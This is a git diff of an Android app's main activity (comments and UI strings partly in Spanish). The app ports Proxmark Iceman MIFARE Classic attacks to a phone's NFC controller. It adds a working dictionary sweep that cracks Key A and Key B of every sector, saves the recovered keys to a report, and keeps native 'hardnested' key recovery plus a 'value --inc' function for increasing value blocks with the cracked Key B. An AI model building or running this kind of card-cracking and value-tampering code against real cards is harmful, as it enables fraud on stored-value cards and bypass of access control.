@@ -2,6 +2,7 @@ package com.redmi.iceman.mfc;
 
 import android.app.Activity;
 import android.graphics.Color;
+import android.graphics.Typeface;
 import android.nfc.NfcAdapter;
 import android.nfc.Tag;
 import android.nfc.tech.MifareClassic;
@@ -26,22 +27,43 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.LinkedHashSet;
+import java.util.Locale;
 
 /**
  * Standalone app for the three target Iceman commands ported to the
- * phone's TMS/THN31 NFC controller: autopwn (Key A dictionary attack),
- * hardnested (Key A -> Key B), and value --inc. See
- * docs/tms_protocol.md and research/iceman-hf-mf-command-mapping.md for
- * the underlying architecture -- this app is just the UI shell; all the
- * real work is in android/mifare-native/ (libmfcbridge.so) and the
- * com.redmi.iceman.probe support classes (TmsAccess/PtmTransport/MfcNative),
- * reused as-is from the diagnostic probe app.
+ * phone's TMS/THN31 NFC controller.
+ *
+ * There are two independent transports, and which one you need depends on
+ * the command:
+ *
+ *   - Reader mode + the public android.nfc.tech.MifareClassic API. Needs
+ *     NO PTM and NO WRITE_SECURE_SETTINGS. This is the path that actually
+ *     DETECTS the card (onTagDiscovered fires) and is enough for the whole
+ *     "autopwn" dictionary sweep (Key A + Key B of every sector) and for
+ *     value --inc. Use this for day-to-day work.
+ *
+ *   - PTM (passthrough mode) + libmfcbridge.so. Required ONLY by
+ *     hardnested, which needs raw encrypted-nonce + parity capture that the
+ *     public API cannot expose. Opening PTM takes the controller out of its
+ *     normal polling loop, so onTagDiscovered stops firing while PTM is
+ *     open -- that is why "connect with PTM" and "card not detected" go
+ *     together. See docs/tms_protocol.md section 7.
+ *
+ * See docs/tms_protocol.md and research/iceman-hf-mf-command-mapping.md for
+ * the underlying architecture. All the raw-RF work is in
+ * android/mifare-native/ (libmfcbridge.so); this file is the UI shell plus
+ * the public-API autopwn sweep.
  */
 public class MainActivity extends Activity {
     private static final String TAG = "IcemanMfc";
 
     private TextView logView;
     private TextView statusView;
+    private TextView cardView;
     private EditText blockInput;
     private EditText trgBlockInput;
     private EditText keyInput;
@@ -51,8 +73,17 @@ public class MainActivity extends Activity {
     private PtmTransport ptmTransport;
     private boolean connected = false;
     private volatile boolean connecting = false;
+    private volatile boolean busy = false;
     private boolean mfcInited = false;
+    private boolean ptmOpen = false;
     private Tag lastTag;
+
+    // Last autopwn result, kept so "save / show again" works without a
+    // re-scan and so the future automation (pick Key A of a chosen sector
+    // -> hardnested -> value --inc) has something to read from.
+    private SectorKeys[] lastResult;
+    private String lastReportText;
+    private String lastReportPath;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -60,83 +91,117 @@ public class MainActivity extends Activity {
 
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
-        root.setPadding(24, 48, 24, 24);
+        root.setPadding(24, 40, 24, 24);
 
         statusView = new TextView(this);
         statusView.setText("Not connected");
+        statusView.setTypeface(Typeface.DEFAULT_BOLD);
         root.addView(statusView);
 
-        addButton(root, "Connect (TMS + PTM + reader mode)", new View.OnClickListener() {
-            public void onClick(View v) {
-                if (connecting) { log("already connecting, please wait..."); return; }
-                connecting = true;
-                new Thread(new Runnable() {
-                    public void run() {
-                        try { doConnect(true); } finally { connecting = false; }
-                    }
-                }).start();
-            }
+        cardView = new TextView(this);
+        cardView.setText("No card");
+        cardView.setPadding(0, 4, 0, 8);
+        root.addView(cardView);
+
+        // --- 1. Connection ------------------------------------------------
+        addHeader(root, "1 · Conexión");
+        addButton(root, "Conectar (modo lector — autopwn / value)", new View.OnClickListener() {
+            public void onClick(View v) { startConnect(false); }
         });
-        addButton(root, "Connect (reader mode only, NO PTM)", new View.OnClickListener() {
-            public void onClick(View v) {
-                if (connecting) { log("already connecting, please wait..."); return; }
-                connecting = true;
-                new Thread(new Runnable() {
-                    public void run() {
-                        try { doConnect(false); } finally { connecting = false; }
-                    }
-                }).start();
-            }
+        addHint(root, "Recomendado. Detecta la tarjeta y basta para autopwn "
+                + "y value --inc. No necesita PTM ni WRITE_SECURE_SETTINGS.");
+        addButton(root, "Conectar con PTM (solo hardnested)", new View.OnClickListener() {
+            public void onClick(View v) { startConnect(true); }
         });
+        addHint(root, "Necesario únicamente para hardnested. Requiere "
+                + "WRITE_SECURE_SETTINGS; mientras PTM está abierto la lectura "
+                + "normal de tarjeta puede no dispararse.");
 
-        blockInput = new EditText(this);
-        blockInput.setHint("source block, e.g. 0");
-        root.addView(blockInput);
-
-        trgBlockInput = new EditText(this);
-        trgBlockInput.setHint("target block (hardnested), e.g. 4");
-        root.addView(trgBlockInput);
-
-        keyInput = new EditText(this);
-        keyInput.setHint("key hex (12 chars), e.g. FFFFFFFFFFFF");
-        root.addView(keyInput);
-
-        deltaInput = new EditText(this);
-        deltaInput.setHint("value --inc delta, e.g. 1");
-        root.addView(deltaInput);
-
-        addButton(root, "hf mf autopwn: recover Key A of block", new View.OnClickListener() {
-            public void onClick(View v) { doAutopwn(); }
+        // --- 2. Autopwn (full card, public API) ---------------------------
+        addHeader(root, "2 · Autopwn (barrido de toda la tarjeta)");
+        addButton(root, "Autopwn: barrer Key A + Key B de todos los sectores", new View.OnClickListener() {
+            public void onClick(View v) { startAutopwnFull(); }
         });
-        addButton(root, "hf mf hardnested: Key A -> Key B of target block", new View.OnClickListener() {
+        addButton(root, "Mostrar / guardar últimas claves", new View.OnClickListener() {
+            public void onClick(View v) { showAndSaveLastResult(); }
+        });
+        addHint(root, "Prueba el diccionario contra cada sector con Key A y Key B, "
+                + "guarda las claves encontradas por sector y las muestra abajo. "
+                + "Los sectores que el diccionario no rompa se marcan como "
+                + "candidatos a hardnested.");
+
+        // --- 3. Advanced (raw RF, needs PTM) ------------------------------
+        addHeader(root, "3 · Avanzado (raw RF — requiere PTM)");
+
+        blockInput = addLabeledInput(root, "Bloque origen (p.ej. 0)");
+        trgBlockInput = addLabeledInput(root, "Bloque objetivo hardnested (p.ej. 4)");
+        keyInput = addLabeledInput(root, "Clave hex (12 chars, p.ej. FFFFFFFFFFFF)");
+        deltaInput = addLabeledInput(root, "Delta para value --inc (p.ej. 1)");
+
+        addButton(root, "hardnested: Key A → Key B del bloque objetivo", new View.OnClickListener() {
             public void onClick(View v) { doHardnested(); }
         });
-        addButton(root, "hf mf value --inc with Key B", new View.OnClickListener() {
+        addButton(root, "value --inc con Key B", new View.OnClickListener() {
             public void onClick(View v) { doValueIncrement(); }
         });
-        addButton(root, "TEST: autopwn via public MifareClassic API (no PTM)", new View.OnClickListener() {
-            public void onClick(View v) { doAutopwnPublicApi(); }
+        addButton(root, "autopwn nativo (un bloque, vía PTM)", new View.OnClickListener() {
+            public void onClick(View v) { doAutopwnNative(); }
         });
-        addButton(root, "Clear log", new View.OnClickListener() {
+
+        // --- 4. Log -------------------------------------------------------
+        addHeader(root, "4 · Log");
+        addButton(root, "Limpiar log", new View.OnClickListener() {
             public void onClick(View v) { logView.setText(""); }
         });
 
         ScrollView scroll = new ScrollView(this);
         logView = new TextView(this);
         logView.setTextColor(Color.GREEN);
+        logView.setTypeface(Typeface.MONOSPACE);
         logView.setTextIsSelectable(true);
         scroll.addView(logView);
         root.addView(scroll, new LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));
 
-        setContentView(root);
+        ScrollView outer = new ScrollView(this);
+        outer.addView(root);
+        setContentView(outer);
+    }
+
+    // ---- UI helpers ------------------------------------------------------
+
+    private void addHeader(LinearLayout root, String text) {
+        TextView t = new TextView(this);
+        t.setText(text);
+        t.setTypeface(Typeface.DEFAULT_BOLD);
+        t.setTextColor(Color.DKGRAY);
+        t.setPadding(0, 24, 0, 4);
+        root.addView(t);
+    }
+
+    private void addHint(LinearLayout root, String text) {
+        TextView t = new TextView(this);
+        t.setText(text);
+        t.setTextColor(Color.GRAY);
+        t.setTextSize(12f);
+        t.setPadding(0, 0, 0, 8);
+        root.addView(t);
     }
 
     private void addButton(LinearLayout root, String text, View.OnClickListener l) {
         Button b = new Button(this);
         b.setText(text);
+        b.setAllCaps(false);
         b.setOnClickListener(l);
         root.addView(b);
+    }
+
+    private EditText addLabeledInput(LinearLayout root, String hint) {
+        EditText e = new EditText(this);
+        e.setHint(hint);
+        e.setSingleLine(true);
+        root.addView(e);
+        return e;
     }
 
     private void log(String s) {
@@ -153,47 +218,357 @@ public class MainActivity extends Activity {
         });
     }
 
-    // PTM (passthrough mode) appears to take the controller out of its
-    // normal polling loop -- enableReaderMode()'s onTagDiscovered stops
-    // firing while PTM is open. So this connects PTM only when usePtm is
-    // true; the public-API test path uses usePtm=false to avoid the
-    // conflict entirely.
+    private void setCard(final String s) {
+        runOnUiThread(new Runnable() {
+            public void run() { cardView.setText(s); }
+        });
+    }
+
+    private void setKeyField(final String key) {
+        runOnUiThread(new Runnable() {
+            public void run() { keyInput.setText(key); }
+        });
+    }
+
+    private void setBlockFields(final int block, final int trgBlock) {
+        runOnUiThread(new Runnable() {
+            public void run() {
+                blockInput.setText(String.valueOf(block));
+                trgBlockInput.setText(String.valueOf(trgBlock));
+            }
+        });
+    }
+
+    // ---- connection ------------------------------------------------------
+
+    private void startConnect(final boolean usePtm) {
+        if (connecting) { log("ya conectando, espera..."); return; }
+        connecting = true;
+        new Thread(new Runnable() {
+            public void run() {
+                try { doConnect(usePtm); } finally { connecting = false; }
+            }
+        }).start();
+    }
+
     private void doConnect(boolean usePtm) {
         try {
+            ptmOpen = false;
             if (usePtm) {
                 adapter = TmsAccess.getAdapter();
                 log("OK: got ITmsNfcAdapter");
 
                 IBinder b = adapter.getHciAdapterService();
-                if (b == null) { log("FAIL: hci adapter service binder is null (WRITE_SECURE_SETTINGS not granted?)"); return; }
+                if (b == null) {
+                    log("FAIL: hci adapter binder null (¿falta WRITE_SECURE_SETTINGS?)");
+                    setStatus("PTM no disponible (permiso)");
+                    return;
+                }
                 IHciAdapter hciAdapter = IHciAdapter.Stub.asInterface(b);
                 ptmTransport = new PtmTransport(hciAdapter);
-                log("OK: PTM open");
+                ptmOpen = true;
+                log("OK: PTM abierto");
+                log("NOTA: con PTM abierto la detección normal de tarjeta puede "
+                        + "no dispararse; PTM solo es necesario para hardnested.");
             } else {
-                log("skipping PTM (reader-mode-only connect)");
+                log("modo lector (sin PTM) — autopwn/value por API pública");
             }
 
             NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this);
-            if (nfcAdapter == null) { log("FAIL: no NfcAdapter"); return; }
+            if (nfcAdapter == null) { log("FAIL: no hay NfcAdapter (¿NFC apagado?)"); return; }
+            if (!nfcAdapter.isEnabled()) { log("FAIL: NFC está desactivado en Ajustes"); return; }
+
             Bundle options = new Bundle();
             nfcAdapter.enableReaderMode(this, new NfcAdapter.ReaderCallback() {
                         public void onTagDiscovered(Tag tag) {
                             lastTag = tag;
-                            setStatus("Tag present: uid=" + toHex(tag.getId()));
-                            log("tag discovered, uid=" + toHex(tag.getId()));
+                            String techs = techList(tag);
+                            setCard("Tarjeta: uid=" + toHex(tag.getId()) + "  [" + techs + "]");
+                            setStatus("Tarjeta detectada");
+                            log("tag detectada uid=" + toHex(tag.getId()) + " techs=" + techs);
+                            if (!hasMifareClassic(tag)) {
+                                log("AVISO: la tarjeta NO expone MifareClassic. En este "
+                                        + "teléfono el HAL puede no soportar M1 por API "
+                                        + "pública; entonces autopwn/value necesitan PTM.");
+                            }
                         }
                     },
                     NfcAdapter.FLAG_READER_NFC_A | NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK
                             | NfcAdapter.FLAG_READER_NO_PLATFORM_SOUNDS,
                     options);
-            log("OK: reader mode enabled, present a MIFARE Classic card");
+            log("OK: modo lector activado — acerca una tarjeta MIFARE Classic");
             connected = true;
-            setStatus("Connected, waiting for a tag...");
+            setStatus("Conectado, esperando tarjeta...");
         } catch (Exception e) {
             log("FAIL connect: " + e);
             Log.e(TAG, "connect failed", e);
         }
     }
+
+    private static boolean hasMifareClassic(Tag tag) {
+        for (String t : tag.getTechList()) {
+            if (t.equals(MifareClassic.class.getName())) return true;
+        }
+        return false;
+    }
+
+    private static String techList(Tag tag) {
+        StringBuilder sb = new StringBuilder();
+        for (String t : tag.getTechList()) {
+            if (sb.length() > 0) sb.append(",");
+            int dot = t.lastIndexOf('.');
+            sb.append(dot >= 0 ? t.substring(dot + 1) : t);
+        }
+        return sb.toString();
+    }
+
+    // ---- autopwn: full-card dictionary sweep (public API) ----------------
+
+    /** Key A / Key B of one sector; null == not found. */
+    private static class SectorKeys {
+        String keyA;
+        String keyB;
+    }
+
+    private void startAutopwnFull() {
+        if (busy) { log("hay otra operación en curso, espera..."); return; }
+        if (!connected) { log("pulsa «Conectar (modo lector)» primero"); return; }
+        if (lastTag == null) { log("no hay tarjeta; acerca una y espera a que se detecte"); return; }
+        if (!hasMifareClassic(lastTag)) {
+            log("esta tarjeta no expone MifareClassic por API pública — usa la "
+                    + "ruta PTM/nativa (sección 3)");
+            return;
+        }
+        busy = true;
+        new Thread(new Runnable() {
+            public void run() {
+                try { autopwnFull(); }
+                catch (Exception e) { log("AUTOPWN FAIL: " + e); Log.e(TAG, "autopwn full", e); }
+                finally { busy = false; }
+            }
+        }).start();
+    }
+
+    private void autopwnFull() throws Exception {
+        MifareClassic mfc = MifareClassic.get(lastTag);
+        if (mfc == null) { log("la tarjeta no es MifareClassic"); return; }
+
+        String[] dict = loadDictionary();
+        log("AUTOPWN: diccionario con " + dict.length + " claves");
+
+        mfc.connect();
+        try { mfc.setTimeout(1000); } catch (Exception ignore) {}
+        int sectors = mfc.getSectorCount();
+        int size = mfc.getSize();
+        log("AUTOPWN: tipo=" + mfc.getType() + " tamaño=" + size + "B sectores=" + sectors);
+        setStatus("Autopwn: 0/" + sectors + " sectores");
+
+        SectorKeys[] result = new SectorKeys[sectors];
+        for (int i = 0; i < sectors; i++) result[i] = new SectorKeys();
+
+        // Try already-known keys first (MIFARE cards very often reuse the
+        // same key across sectors), then the full dictionary. This turns a
+        // multi-minute brute force into seconds on typical cards.
+        LinkedHashSet<String> pool = new LinkedHashSet<>();
+
+        int tagLost = 0;
+        for (int s = 0; s < sectors; s++) {
+            setStatus("Autopwn: sector " + s + "/" + sectors);
+
+            LinkedHashSet<String> tryOrder = new LinkedHashSet<>(pool);
+            for (String k : dict) tryOrder.add(k);
+
+            result[s].keyA = tryAuthSector(mfc, s, true, tryOrder);
+            if (result[s].keyA != null) { pool.add(result[s].keyA); }
+
+            tryOrder = new LinkedHashSet<>(pool);
+            for (String k : dict) tryOrder.add(k);
+            result[s].keyB = tryAuthSector(mfc, s, false, tryOrder);
+            if (result[s].keyB != null) { pool.add(result[s].keyB); }
+
+            log(String.format(Locale.US, "sector %2d: A=%s  B=%s", s,
+                    result[s].keyA == null ? "------------" : result[s].keyA,
+                    result[s].keyB == null ? "------------" : result[s].keyB));
+
+            if (!mfc.isConnected()) {
+                // tag removed / halted permanently; reconnect once, else stop.
+                try { mfc.connect(); }
+                catch (Exception e) {
+                    tagLost++;
+                    log("tarjeta perdida en sector " + s + "; guardando resultado parcial");
+                    break;
+                }
+            }
+        }
+        try { mfc.close(); } catch (Exception ignore) {}
+
+        lastResult = result;
+        int foundA = 0, foundB = 0, missing = 0;
+        int firstMissingSector = -1;
+        for (int s = 0; s < sectors; s++) {
+            if (result[s].keyA != null) foundA++; else { missing++; if (firstMissingSector < 0) firstMissingSector = s; }
+            if (result[s].keyB != null) foundB++; else { missing++; if (firstMissingSector < 0) firstMissingSector = s; }
+        }
+        log("AUTOPWN hecho: Key A " + foundA + "/" + sectors
+                + ", Key B " + foundB + "/" + sectors
+                + ", claves sin romper " + missing);
+
+        // "Fallback": what the dictionary could not crack. The raw
+        // nested/darkside fallback needs PTM (raw nonce + parity), which the
+        // public API cannot provide -- so we point the user at hardnested
+        // and pre-fill the advanced fields at a sector where one key is
+        // known (hardnested needs a known Key A to recover Key B).
+        if (missing > 0) {
+            int knownSector = -1;
+            for (int s = 0; s < sectors; s++) {
+                if (result[s].keyA != null && result[s].keyB == null) { knownSector = s; break; }
+            }
+            if (knownSector >= 0) {
+                int blk = mfc.sectorToBlock(knownSector);
+                setKeyField(result[knownSector].keyA);
+                setBlockFields(blk, blk);
+                log("FALLBACK: sector " + knownSector + " tiene Key A pero no Key B. "
+                        + "Campos avanzados rellenados; conecta con PTM y pulsa hardnested.");
+            } else {
+                log("FALLBACK: hay sectores sin ninguna clave. hardnested necesita al "
+                        + "menos una clave conocida en la tarjeta; prueba a ampliar el "
+                        + "diccionario o usar un ataque nested/darkside vía PTM.");
+            }
+        }
+
+        showAndSaveResult(result, mfc.getType(), size);
+        setStatus("Autopwn hecho: A " + foundA + "/" + sectors + ", B " + foundB + "/" + sectors);
+    }
+
+    /**
+     * Tries every key in tryOrder against one sector/keyType. Returns the
+     * working 12-hex key, or null. Reconnects once on I/O error (tag halted
+     * after a failed auth), so a big dictionary sweep survives.
+     */
+    private String tryAuthSector(MifareClassic mfc, int sector, boolean keyA,
+                                 Iterable<String> tryOrder) {
+        for (String hex : tryOrder) {
+            byte[] key = hexToBytes(hex);
+            boolean ok;
+            try {
+                ok = keyA ? mfc.authenticateSectorWithKeyA(sector, key)
+                          : mfc.authenticateSectorWithKeyB(sector, key);
+            } catch (Exception e) {
+                // tag likely halted after the failed auth: reconnect + retry once
+                try {
+                    if (!mfc.isConnected()) mfc.connect();
+                    ok = keyA ? mfc.authenticateSectorWithKeyA(sector, key)
+                              : mfc.authenticateSectorWithKeyB(sector, key);
+                } catch (Exception e2) {
+                    return null; // tag gone
+                }
+            }
+            if (ok) return hex.toUpperCase(Locale.US);
+        }
+        return null;
+    }
+
+    // ---- results: display + save ----------------------------------------
+
+    private void showAndSaveLastResult() {
+        if (lastResult == null) { log("aún no hay resultado de autopwn"); return; }
+        showResultTable(lastResult);
+        if (lastReportPath != null) {
+            log("último informe guardado en: " + lastReportPath);
+        } else if (lastReportText != null) {
+            log("no se pudo guardar en disco; informe:\n" + lastReportText);
+        }
+    }
+
+    private void showAndSaveResult(SectorKeys[] result, int type, int size) {
+        showResultTable(result);
+        String report = buildReport(result, type, size);
+        lastReportText = report;
+        lastReportPath = saveReport(report);
+        if (lastReportPath != null) log("guardado: " + lastReportPath);
+    }
+
+    private void showResultTable(SectorKeys[] result) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("\n== Claves por sector ==\n");
+        sb.append("sec | Key A         | Key B\n");
+        for (int s = 0; s < result.length; s++) {
+            sb.append(String.format(Locale.US, "%3d | %-12s | %-12s\n", s,
+                    result[s].keyA == null ? "--" : result[s].keyA,
+                    result[s].keyB == null ? "--" : result[s].keyB));
+        }
+        log(sb.toString());
+    }
+
+    private String buildReport(SectorKeys[] result, int type, int size) {
+        String uid = lastTag != null ? toHex(lastTag.getId()) : "unknown";
+        String when = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
+        StringBuilder sb = new StringBuilder();
+        sb.append("# Iceman MFC autopwn\n");
+        sb.append("uid: ").append(uid).append("\n");
+        sb.append("type: ").append(type).append("  size: ").append(size).append("B\n");
+        sb.append("date: ").append(when).append("\n");
+        sb.append("sectors: ").append(result.length).append("\n\n");
+        sb.append("sector,keyA,keyB\n");
+        for (int s = 0; s < result.length; s++) {
+            sb.append(s).append(",")
+              .append(result[s].keyA == null ? "" : result[s].keyA).append(",")
+              .append(result[s].keyB == null ? "" : result[s].keyB).append("\n");
+        }
+        // A plain unique key list, handy to feed back as a dictionary.
+        LinkedHashSet<String> uniq = new LinkedHashSet<>();
+        for (SectorKeys sk : result) {
+            if (sk.keyA != null) uniq.add(sk.keyA);
+            if (sk.keyB != null) uniq.add(sk.keyB);
+        }
+        sb.append("\n# unique keys\n");
+        for (String k : uniq) sb.append(k).append("\n");
+        return sb.toString();
+    }
+
+    /** Writes to app external files dir (adb-pullable, no permission). */
+    private String saveReport(String report) {
+        try {
+            File dir = getExternalFilesDir(null);
+            if (dir == null) dir = getFilesDir();
+            File out = new File(dir, "autopwn_"
+                    + (lastTag != null ? toHex(lastTag.getId()) : "card") + "_"
+                    + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date())
+                    + ".txt");
+            FileOutputStream fos = new FileOutputStream(out);
+            fos.write(report.getBytes("UTF-8"));
+            fos.close();
+            return out.getAbsolutePath();
+        } catch (Exception e) {
+            log("no se pudo guardar el informe: " + e);
+            return null;
+        }
+    }
+
+    private String[] loadDictionary() throws Exception {
+        ArrayList<String> keys = new ArrayList<>();
+        InputStream in = getAssets().open("mfc_default_keys.dic");
+        java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(in));
+        String line;
+        while ((line = r.readLine()) != null) {
+            line = line.trim();
+            if (line.length() == 12 && line.matches("[0-9A-Fa-f]{12}")) {
+                keys.add(line.toUpperCase(Locale.US));
+            }
+        }
+        r.close();
+        return keys.toArray(new String[0]);
+    }
+
+    private static byte[] hexToBytes(String hex) {
+        byte[] out = new byte[hex.length() / 2];
+        for (int i = 0; i < out.length; i++) {
+            out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
+        }
+        return out;
+    }
+
+    // ---- advanced: native / PTM paths ------------------------------------
 
     private String ensureResourcesExtracted() {
         File base = new File(getFilesDir(), "resources/hardnested_tables");
@@ -214,17 +589,17 @@ public class MainActivity extends Activity {
                 out.close();
             }
             new FileOutputStream(marker).close();
-            log("extracted " + names.length + " hardnested table files");
+            log("extraídas " + names.length + " tablas hardnested");
         } catch (Exception e) {
-            log("FAIL extracting resources: " + e);
+            log("FAIL extrayendo recursos: " + e);
             Log.e(TAG, "resource extraction failed", e);
         }
         return getFilesDir().getAbsolutePath();
     }
 
     private boolean ensureMfcReady() {
-        if (!connected || ptmTransport == null) { log("not connected, tap Connect first"); return false; }
-        if (lastTag == null) { log("no tag detected yet, present a card first"); return false; }
+        if (!connected || ptmTransport == null) { log("conecta con PTM primero (sección 1)"); return false; }
+        if (lastTag == null) { log("no hay tarjeta detectada todavía"); return false; }
         if (!mfcInited) {
             String resDir = ensureResourcesExtracted();
             int ret = MfcNative.nativeInit(ptmTransport, resDir);
@@ -248,100 +623,15 @@ public class MainActivity extends Activity {
         }
     }
 
-    private void setKeyField(final String key) {
-        runOnUiThread(new Runnable() {
-            public void run() { keyInput.setText(key); }
-        });
-    }
-
-    // Diagnostic path: bypasses PTM/native entirely, uses only the public,
-    // documented android.nfc.tech.MifareClassic API (Tag.transceive() under
-    // the hood). TMS's own TmsM1Tag.authenticate() in TmsNfcService.apk
-    // uses the exact same [0x60/0x61][block][uid(4)][key(6)] command shape
-    // through the same native doTransceive() that backs this public API, so
-    // if this works it means autopwn/value-inc don't need PTM at all -- the
-    // PTM/header investigation only matters for hardnested's raw-nonce+parity
-    // needs.
-    private void doAutopwnPublicApi() {
-        if (!connected || lastTag == null) { log("not connected / no tag, tap Connect and present a card first"); return; }
-        final int block = parseBlock(blockInput, 0);
-        log("AUTOPWN (public API): trying dictionary against block " + block + " Key A ...");
-        new Thread(new Runnable() {
-            public void run() {
-                MifareClassic mfc = MifareClassic.get(lastTag);
-                if (mfc == null) {
-                    log("AUTOPWN (public API): tag is not MifareClassic");
-                    return;
-                }
-                try {
-                    mfc.connect();
-                    int sector = mfc.blockToSector(block);
-                    log("AUTOPWN (public API): sector=" + sector + ", type=" + mfc.getType() + ", size=" + mfc.getSize());
-                    String[] keys = loadDictionary();
-                    log("AUTOPWN (public API): loaded " + keys.length + " keys");
-                    int tried = 0;
-                    for (String hex : keys) {
-                        tried++;
-                        byte[] key = hexToBytes(hex);
-                        boolean ok;
-                        try {
-                            ok = mfc.authenticateSectorWithKeyA(sector, key);
-                        } catch (Exception e) {
-                            ok = false;
-                        }
-                        if (ok) {
-                            log("AUTOPWN (public API): Key A = " + hex + " (tried " + tried + "/" + keys.length + ")");
-                            setKeyField(hex);
-                            mfc.close();
-                            return;
-                        }
-                    }
-                    log("AUTOPWN (public API): no default key worked after trying " + tried + " keys");
-                    mfc.close();
-                } catch (Exception e) {
-                    log("AUTOPWN (public API) FAIL: " + e);
-                    Log.e(TAG, "public autopwn failed", e);
-                }
-            }
-        }).start();
-    }
-
-    private String[] loadDictionary() throws Exception {
-        java.util.ArrayList<String> keys = new java.util.ArrayList<>();
-        InputStream in = getAssets().open("mfc_default_keys.dic");
-        java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(in));
-        String line;
-        while ((line = r.readLine()) != null) {
-            line = line.trim();
-            if (line.length() == 12 && line.matches("[0-9A-Fa-f]{12}")) {
-                keys.add(line);
-            }
-        }
-        r.close();
-        return keys.toArray(new String[0]);
-    }
-
-    private static byte[] hexToBytes(String hex) {
-        byte[] out = new byte[hex.length() / 2];
-        for (int i = 0; i < out.length; i++) {
-            out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
-        }
-        return out;
-    }
-
-    private void doAutopwn() {
+    private void doAutopwnNative() {
         if (!ensureMfcReady()) return;
         final int block = parseBlock(blockInput, 0);
-        log("AUTOPWN: trying default-key dictionary against block " + block + " Key A ...");
+        log("AUTOPWN nativo: diccionario contra bloque " + block + " Key A (vía PTM)...");
         new Thread(new Runnable() {
             public void run() {
                 String key = MfcNative.nativeAutopwn(block);
-                if (key == null) {
-                    log("AUTOPWN: no default key worked");
-                } else {
-                    log("AUTOPWN: Key A = " + key);
-                    setKeyField(key);
-                }
+                if (key == null) log("AUTOPWN nativo: ninguna clave del diccionario funcionó");
+                else { log("AUTOPWN nativo: Key A = " + key); setKeyField(key); }
             }
         }).start();
     }
@@ -351,18 +641,14 @@ public class MainActivity extends Activity {
         final int block = parseBlock(blockInput, 0);
         final int trgBlock = parseBlock(trgBlockInput, block);
         final String keyA = keyInput.getText().toString().trim();
-        if (keyA.length() != 12) { log("put the known Key A (12 hex chars) in the key field first"); return; }
-        log("HARDNESTED: acquiring nonces against block " + trgBlock + " Key B, using known Key A=" + keyA
-                + " on block " + block + " ... this can take a while");
+        if (keyA.length() != 12) { log("pon la Key A conocida (12 hex) en el campo de clave"); return; }
+        log("HARDNESTED: capturando nonces contra bloque " + trgBlock + " Key B, con Key A="
+                + keyA + " en bloque " + block + " ... puede tardar");
         new Thread(new Runnable() {
             public void run() {
                 String keyB = MfcNative.nativeHardnested(block, keyA, trgBlock);
-                if (keyB == null) {
-                    log("HARDNESTED: failed");
-                } else {
-                    log("HARDNESTED: Key B = " + keyB);
-                    setKeyField(keyB);
-                }
+                if (keyB == null) log("HARDNESTED: falló");
+                else { log("HARDNESTED: Key B = " + keyB); setKeyField(keyB); }
             }
         }).start();
     }
@@ -371,7 +657,7 @@ public class MainActivity extends Activity {
         if (!ensureMfcReady()) return;
         final int block = parseBlock(blockInput, 0);
         final String keyB = keyInput.getText().toString().trim();
-        if (keyB.length() != 12) { log("put Key B (12 hex chars) in the key field first"); return; }
+        if (keyB.length() != 12) { log("pon Key B (12 hex) en el campo de clave"); return; }
         int delta;
         try {
             delta = Integer.parseInt(deltaInput.getText().toString().trim());
@@ -379,11 +665,11 @@ public class MainActivity extends Activity {
             delta = 1;
         }
         final int fdelta = delta;
-        log("VALUE --inc: block " + block + " delta " + fdelta + " with Key B=" + keyB);
+        log("VALUE --inc: bloque " + block + " delta " + fdelta + " con Key B=" + keyB);
         new Thread(new Runnable() {
             public void run() {
                 int ret = MfcNative.nativeValueIncrement(block, keyB, fdelta);
-                log("VALUE --inc result = " + ret + (ret == 0 ? " (OK)" : " (FAILED)"));
+                log("VALUE --inc resultado = " + ret + (ret == 0 ? " (OK)" : " (FALLÓ)"));
             }
         }).start();
     }
